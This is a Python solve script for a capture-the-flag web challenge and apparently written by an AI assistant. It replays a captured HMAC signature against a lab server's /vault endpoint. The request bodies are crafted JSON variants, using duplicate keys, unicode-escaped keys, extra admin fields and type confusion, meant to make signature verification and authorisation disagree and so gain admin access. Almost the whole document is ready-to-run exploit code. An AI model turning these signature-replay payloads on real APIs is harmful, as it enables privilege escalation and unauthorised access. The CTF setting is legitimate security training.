"""
Signed, Sealed, Misinterpreted - HMAC verify/authorize mismatch.

/challenge hands us a signed request:
    body = {"action":"view","role":"user"}
    X-Signature = HMAC-SHA256(key, <some canonical form of the body>)

We don't have the key, but we may REUSE this signature. That only works if the
server canonicalizes the parsed JSON before HMACing (otherwise no byte could
change). The bug ("Misinterpreted") is that the bytes it *verifies* and the
value it *authorizes on* are parsed differently - via duplicate keys, key
ordering/whitespace, unicode-escaped keys, or an unsigned field.

This script replays the given signature against /vault with a battery of body
variants that each exploit one such mismatch, and prints every response so the
winning one (an admin vault / cns{...}) stands out. It sends RAW bodies so
duplicate keys survive (a dict would collapse them).

Usage: python3 solve.py
"""
from http.client import HTTPConnection
import json
import re

HOST = "cns-test.idlab.uantwerpen.be"
PORT = 50007


def request(method, path, body=None, headers=None):
    conn = HTTPConnection(HOST, PORT, timeout=15)
    conn.request(method, path, body=body, headers=headers or {})
    resp = conn.getresponse()
    data = resp.read().decode(errors="replace")
    conn.close()
    return resp.status, data


def get_challenge():
    _, data = request("GET", "/challenge")
    obj = json.loads(data)
    msg = obj["message"]
    sig = obj["signature"]
    return msg, sig


def main():
    msg, sig = get_challenge()
    print(f"[+] message   = {json.dumps(msg)}")
    print(f"[+] signature = {sig}\n")

    # Raw body variants. Each targets one verify/authorize mismatch.
    # The signed canonical form is of {"action":"view","role":"user"}, so a
    # variant verifies iff the VERIFIER still sees that - while the AUTHORIZER
    # is tricked into reading role=admin.
    variants = [
        ("baseline (unchanged)",
         '{"action":"view","role":"user"}'),

        # Unsigned-field / loose-binding: maybe only 'action' is signed.
        ("role flipped to admin",
         '{"action":"view","role":"admin"}'),

        # Key reorder - diagnostic: verifies only if server canonicalizes (sort_keys).
        ("reordered keys, role=user",
         '{"role":"user","action":"view"}'),

        # Whitespace - diagnostic: verifies only if server re-serializes.
        ("spaced formatting, role=user",
         '{"action": "view", "role": "user"}'),

        # Duplicate role: verifier takes first (user -> valid sig),
        # authorizer takes last (admin).
        ("dup role: user then admin",
         '{"action":"view","role":"user","role":"admin"}'),

        # Duplicate role: verifier takes last (user -> valid sig),
        # authorizer takes first (admin).
        ("dup role: admin then user",
         '{"action":"view","role":"admin","role":"user"}'),

        # Duplicate with role placed before action too.
        ("dup role admin-first, reordered",
         '{"role":"admin","action":"view","role":"user"}'),

        # Unicode-escaped duplicate key (one parser folds o -> o, other doesn't).
        ("unicode-escaped role key = admin",
         '{"action":"view","r\\u006fle":"admin","role":"user"}'),
        ("unicode-escaped role key = user",
         '{"action":"view","role":"admin","r\\u006fle":"user"}'),

        # Extra admin-ish fields that the authorizer might read.
        ("extra admin:true field",
         '{"action":"view","role":"user","admin":true}'),
        ("action=admin",
         '{"action":"admin","role":"user"}'),
        ("dup action: view then admin",
         '{"action":"view","role":"user","action":"admin"}'),

        # Type confusion on role.
        ("role as list [user,admin]",
         '{"action":"view","role":["user","admin"]}'),
    ]

    headers = {"Content-Type": "application/json", "X-Signature": sig}
    for label, raw in variants:
        try:
            status, data = request("POST", "/vault", body=raw.encode(), headers=headers)
        except Exception as e:
            print(f"[{label}] ERROR {e}")
            continue
        flag = re.search(r"[cC][nN][sS]\{[^}]*\}", data)
        mark = "  <<< FLAG" if flag else ""
        print(f"[{label}]")
        print(f"    body: {raw}")
        print(f"    {status}: {data.strip()[:300]}{mark}\n")
        if flag:
            print(f"==================\nFLAG: {flag.group()}\n==================")
            return

    print("No variant returned a flag. Paste this output and I'll refine the attack.")


if __name__ == "__main__":
    main()
